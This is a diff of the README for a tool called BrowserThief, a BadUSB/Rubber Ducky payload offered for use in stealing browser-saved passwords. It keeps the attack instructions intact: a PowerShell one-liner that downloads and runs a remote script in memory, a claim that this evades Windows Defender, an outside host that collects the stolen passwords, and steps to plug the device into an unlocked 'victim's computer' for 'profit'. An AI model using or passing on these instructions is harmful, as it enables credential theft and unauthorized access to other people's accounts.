@@ -1,11 +1,11 @@
 # BrowserThief
 Rubber Ducky/BadUSB that runs a powershell script to extract and steal browser-saved passwords and stash them at your Flask web server. 
-
+<br/><br/>
 ## Features
 - The powershell script can be run in-memory without writing to disk which evades Windows Defender detection
 - Includes an arduino RubberDucky script that runs in less than 2 seconds
-
-## Instructions
+<br/><br/>
+## Setup
 
 - Setup the web server that catches the passwords
 
@@ -24,7 +24,8 @@ foo@bar:~$ cd BrowserThief/Web
 ```console
 foo@bar:~$ sudo bash build-docker.sh
 ```
-
+<br/><br/>
+## Instructions
 
 -  To simply run the powershell script 
 ```powershell
@@ -33,16 +34,16 @@ iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 - Or you can use the rubber ducky for stealth/speed
 	- Needs an Arduino that supports `<Keyboard.h>` (Nano, Leonardo)
 	- Install Arduino IDE from their [website](https://wiki-content.arduino.cc/en/software)
-	- Open `RubberDuckyScript.ino` using the IDE and replace `https://dump.silvercryptor.xyz` with your IP, check out [Instructions](https://github.com/ScribblerCoder/BrowserThief#Instructions) to setup the Web server
+	- Open `RubberDuckyScript.ino` using the IDE and replace `https://dump.silvercryptor.xyz` with your IP, check out [Setup](https://github.com/ScribblerCoder/BrowserThief#Setup) to setup the Web server
 	- Compile and upload the script to the arduino
 	- Insert the usb to the victim's computer (needs to be unlocked)
 	- Profit 💰💰💰
-
+<br/><br/>
 ## PoC
 
 
 
-
+<br/><br/>
 
 ## Credits
 
